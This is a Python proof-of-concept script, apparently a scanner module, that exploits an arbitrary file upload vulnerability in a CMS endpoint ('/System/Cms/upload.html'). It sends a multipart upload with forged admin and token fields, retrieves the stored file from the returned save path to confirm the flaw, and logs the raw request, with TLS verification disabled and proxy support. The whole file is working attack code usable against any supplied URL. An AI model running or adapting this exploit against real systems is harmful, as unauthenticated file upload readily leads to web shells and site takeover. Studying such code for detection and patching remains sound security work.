'''
Function:
    uploadfile
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import random
import string
import json
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
# path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
# sys.path.append(path)
# from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            # 'User-Agent': get_user_agent.get_user_agent(),
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0'
        }
        self.value_list = []
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url = "{}://{}/System/Cms/upload.html?token=".format(scheme, netloc)
        char = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        payload = "test" + char
        data = {
            "userID": (None, "admin", None),
            "fondsid": (None, "1", None),
            "comid": (None, "1", None),
            "token": (None, "1", None),
            "files[]": ('11.txt', '{}'.format(payload).encode(), None)
        }
        try:
            result = requests.post(url=url, files=data, headers=self.headers, proxies=self.proxies, verify=False)
            result_json = result.json()
            end_url = "{}://{}/uploads".format(scheme, netloc) + json.loads(result_json['info'])["0"]["savepath"].replace("\\", "") + json.loads(result_json['info'])["0"]["savename"]
            end_result = requests.get(url=end_url, headers=self.headers, proxies=self.proxies, verify=False)
            if payload in end_result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n"
                bodys = result.request.body.decode().split("\r\n")
                for body in bodys:
                    self.result_text += "\n                 {}".format(body)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
             return self.result_text
        else:
            return False

